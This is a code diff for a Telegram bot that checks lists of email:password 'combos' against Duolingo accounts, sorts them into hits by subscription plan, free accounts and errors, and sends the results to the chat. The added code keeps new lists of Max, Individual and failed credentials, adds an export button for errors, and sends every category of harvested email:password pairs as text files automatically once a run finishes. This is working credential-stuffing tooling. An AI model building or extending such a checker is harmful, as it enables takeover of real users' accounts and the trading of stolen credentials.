@@ -43,8 +43,11 @@ hits_per_page = 10
 
 # Shared aggregate hit lists (visible to all users) - protected by hits_lock
 all_super_hits = []
+all_max_hits = []
+all_individual_hits = []
 all_family_hits = []
 all_free_accounts = []
+all_error_accounts = []
 
 # Aggregate counters (across all users) - protected by stats_lock
 super_count = 0
@@ -861,7 +864,8 @@ def send_hits_list(chat_id, page=0):
     markup.row(*btns)
     markup.row(
         InlineKeyboardButton("📋 EXPORT HITS", callback_data="copy_all_hits"),
-        InlineKeyboardButton("⚠️ FREE", callback_data="export_free")
+        InlineKeyboardButton("⚠️ FREE", callback_data="export_free"),
+        InlineKeyboardButton("❌ ERRORS", callback_data="export_errors")
     )
     markup.row(InlineKeyboardButton("🏠 MENU", callback_data="main_menu"))
     bot.send_message(chat_id, text, parse_mode='Markdown', reply_markup=markup)
@@ -1082,8 +1086,11 @@ def callback_handler(call):
             bot.answer_callback_query(call.id)
             with hits_lock:
                 all_super_hits.clear()
+                all_max_hits.clear()
+                all_individual_hits.clear()
                 all_family_hits.clear()
                 all_free_accounts.clear()
+                all_error_accounts.clear()
             with stats_lock:
                 super_count = family_count = free_count = fail_count = 0
                 max_count = individual_count = 0
@@ -1147,6 +1154,23 @@ def callback_handler(call):
                 file_obj.name = f"free_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                 bot.send_document(call.message.chat.id, file_obj,
                                   caption=f"⚠️ Free Accounts: {len(free_snap)}")
+
+        elif call.data == "export_errors":
+            bot.answer_callback_query(call.id)
+            with hits_lock:
+                error_snap = list(all_error_accounts)
+            if not error_snap:
+                bot.send_message(call.message.chat.id, "📭 No error accounts collected yet.")
+            else:
+                import io as _io2
+                txt = f"ERROR ACCOUNTS {datetime.now().strftime('%Y-%m-%d %H:%M')}\n" + "="*30 + "\n"
+                txt += f"Total: {len(error_snap)} accounts\n\n"
+                for e, p in error_snap:
+                    txt += f"{e}:{p}\n"
+                file_obj = _io2.BytesIO(txt.encode("utf-8"))
+                file_obj.name = f"errors_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+                bot.send_document(call.message.chat.id, file_obj,
+                                  caption=f"❌ Error Accounts: {len(error_snap)}")
 
         elif call.data.startswith("hits_page_"):
             page = int(call.data.split("_")[2])
@@ -1429,6 +1453,8 @@ def process_combos(chat_id, combos):
                     local_batch_fail += 1
                     with stats_lock:
                         fail_count += 1
+                    with hits_lock:
+                        all_error_accounts.append((email, password))
                     continue
 
                 if status == "HIT":
@@ -1449,6 +1475,7 @@ def process_combos(chat_id, combos):
                             super_count += 1
                         with hits_lock:
                             all_super_hits.append((email, password, detail))
+                            all_max_hits.append((email, password, detail))
                     else:  # INDIVIDUAL
                         local_individual += 1
                         local_batch_individual += 1
@@ -1459,6 +1486,7 @@ def process_combos(chat_id, combos):
                             super_count += 1
                         with hits_lock:
                             all_super_hits.append((email, password, detail))
+                            all_individual_hits.append((email, password, detail))
                     # Inline buttons attached to each hit
                     hit_kb = InlineKeyboardMarkup(row_width=2)
                     hit_kb.add(
@@ -1493,6 +1521,8 @@ def process_combos(chat_id, combos):
                     local_batch_fail += 1
                     with stats_lock:
                         fail_count += 1
+                    with hits_lock:
+                        all_error_accounts.append((email, password))
 
                 if completed - last_update >= PROGRESS_INTERVAL or completed == total:
                     last_update = completed
@@ -1525,6 +1555,43 @@ Duolingo Max Plan : {local_max}\nDuolingo Family Plan : {local_family}\nDuolingo
 {'━' * 32}
 ⏱ {elapsed:.1f}s ∙ 📋 {total:,} ∙ 🎯 {rate}%
 Duolingo Max Plan : {local_max}\nDuolingo Family Plan : {local_family}\nDuolingo Individual Plan : {local_individual}\nDuolingo Free : {local_free}\nErrors : {local_fail}\n💾 VIEW HITS for results""", parse_mode='Markdown')
+
+    # ===== AUTO-SEND RESULT FILES ON COMPLETION =====
+    import io as _autoio
+
+    def _send_result_file(cid, items, fname, caption, combo_only=False):
+        if not items:
+            return
+        lines = []
+        for item in items:
+            if combo_only:
+                e, p = item
+                lines.append(f"{e}:{p}")
+            else:
+                e, p, _ = item
+                lines.append(f"{e}:{p}")
+        fobj = _autoio.BytesIO("\n".join(lines).encode("utf-8"))
+        fobj.name = fname
+        try:
+            bot.send_document(cid, fobj, caption=caption)
+        except Exception:
+            pass
+
+    with hits_lock:
+        _snap_max   = list(all_max_hits)
+        _snap_fam   = list(all_family_hits)
+        _snap_indiv = list(all_individual_hits)
+        _snap_free  = list(all_free_accounts)
+        _snap_err   = list(all_error_accounts)
+
+    _ts = datetime.now().strftime('%Y%m%d_%H%M%S')
+    _send_result_file(chat_id, _snap_max,   f"MAX_{_ts}.txt",        f"💎 Duolingo MAX Plan: {len(_snap_max)}")
+    _send_result_file(chat_id, _snap_fam,   f"FAMILY_{_ts}.txt",     f"👪 Duolingo Family Plan: {len(_snap_fam)}")
+    _send_result_file(chat_id, _snap_indiv, f"INDIVIDUAL_{_ts}.txt", f"👤 Duolingo Individual Plan: {len(_snap_indiv)}")
+    _send_result_file(chat_id, _snap_free,  f"FREE_{_ts}.txt",       f"⚠️ Duolingo Free: {len(_snap_free)}", combo_only=True)
+    _send_result_file(chat_id, _snap_err,   f"ERRORS_{_ts}.txt",     f"❌ Errors/Failed: {len(_snap_err)}", combo_only=True)
+    # ===== END AUTO-SEND =====
+
     send_main_menu(chat_id)
 
     with sess["lock"]:
